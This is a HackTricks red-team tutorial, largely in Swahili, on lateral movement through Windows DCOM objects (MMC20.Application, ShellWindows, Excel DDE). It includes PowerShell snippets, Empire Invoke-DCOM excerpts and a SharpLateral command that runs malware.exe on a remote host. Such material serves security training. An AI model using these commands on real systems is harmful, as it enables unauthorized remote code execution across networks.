# DCOM Exec

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## MMC20.Application

**Kwa maelezo zaidi kuhusu mbinu hii angalia chapisho asilia kutoka [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**

Distributed Component Object Model (DCOM) objects zina uwezo wa kuvutia kwa mwingiliano wa mtandao na vitu. Microsoft inatoa nyaraka kamili kwa DCOM na Component Object Model (COM), zinazopatikana [hapa kwa DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) na [hapa kwa COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). Orodha ya maombi ya DCOM inaweza kupatikana kwa kutumia amri ya PowerShell:
```bash
Get-CimInstance Win32_DCOMApplication
```
The COM object, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), inaruhusu uandishi wa operesheni za MMC snap-in. Kwa kuzingatia, kitu hiki kina `ExecuteShellCommand` njia chini ya `Document.ActiveView`. Taarifa zaidi kuhusu njia hii inaweza kupatikana [hapa](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Angalia inavyofanya kazi:

Kipengele hiki kinarahisisha utekelezaji wa amri kupitia mtandao kupitia programu ya DCOM. Ili kuingiliana na DCOM kwa mbali kama admin, PowerShell inaweza kutumika kama ifuatavyo:
```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Hii amri inajihusisha na programu ya DCOM na inarudisha mfano wa kitu cha COM. Njia ya ExecuteShellCommand inaweza kisha kuitwa ili kutekeleza mchakato kwenye mwenyeji wa mbali. Mchakato unajumuisha hatua zifuatazo:

Angalia mbinu:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Pata RCE:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows & ShellBrowserWindow

**Kwa maelezo zaidi kuhusu mbinu hii angalia chapisho la asili [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

Kitu cha **MMC20.Application** kiligundulika kukosa "LaunchPermissions" wazi, kikirudi kwenye ruhusa zinazoruhusu Wasimamizi kupata. Kwa maelezo zaidi, mjadala unaweza kuchunguzwa [hapa](https://twitter.com/tiraniddo/status/817532039771525120), na matumizi ya [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET kwa ajili ya kuchuja vitu bila Ruhusa ya Uzinduzi wazi yanapendekezwa.

Vitu viwili maalum, `ShellBrowserWindow` na `ShellWindows`, vilisisitizwa kutokana na ukosefu wa Ruhusa za Uzinduzi wazi. Ukosefu wa kiingilio cha rejista cha `LaunchPermission` chini ya `HKCR:\AppID\{guid}` unaashiria ukosefu wa ruhusa wazi.

###  ShellWindows
Kwa `ShellWindows`, ambayo haina ProgID, mbinu za .NET `Type.GetTypeFromCLSID` na `Activator.CreateInstance` zinasaidia kuunda kitu kwa kutumia AppID yake. Mchakato huu unatumia OleView .NET kupata CLSID ya `ShellWindows`. Mara tu inapoundwa, mwingiliano unaweza kufanyika kupitia mbinu ya `WindowsShell.Item`, ikisababisha mwito wa mbinu kama `Document.Application.ShellExecute`.

Mifano ya amri za PowerShell ilitolewa ili kuunda kitu na kutekeleza amri kwa mbali:
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### Lateral Movement with Excel DCOM Objects

Lateral movement inaweza kupatikana kwa kutumia DCOM Excel objects. Kwa maelezo ya kina, ni vyema kusoma mjadala kuhusu kutumia Excel DDE kwa ajili ya lateral movement kupitia DCOM kwenye [blogu ya Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).

Mradi wa Empire unatoa script ya PowerShell, ambayo inaonyesha matumizi ya Excel kwa ajili ya remote code execution (RCE) kwa kubadilisha DCOM objects. Hapa chini kuna vipande kutoka kwa script inayopatikana kwenye [hifadhi ya GitHub ya Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), ikionyesha mbinu tofauti za kutumia Excel kwa RCE:
```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### Vifaa vya Utaftaji wa Kando

Vifaa viwili vinasisitizwa kwa ajili ya kuharakisha mbinu hizi:

- **Invoke-DCOM.ps1**: Skripti ya PowerShell inayotolewa na mradi wa Empire ambayo inarahisisha mwito wa mbinu tofauti za kutekeleza msimbo kwenye mashine za mbali. Skripti hii inapatikana katika hifadhi ya Empire GitHub.

- **SharpLateral**: Kifaa kilichoundwa kwa ajili ya kutekeleza msimbo kwa mbali, ambacho kinaweza kutumika na amri:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Automatic Tools

* Skripti la Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) inaruhusu kwa urahisi kuita njia zote zilizotajwa za kutekeleza msimbo kwenye mashine nyingine.
* Unaweza pia kutumia [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## References

* [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

{% hint style="success" %}
Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **fuata** sisi kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
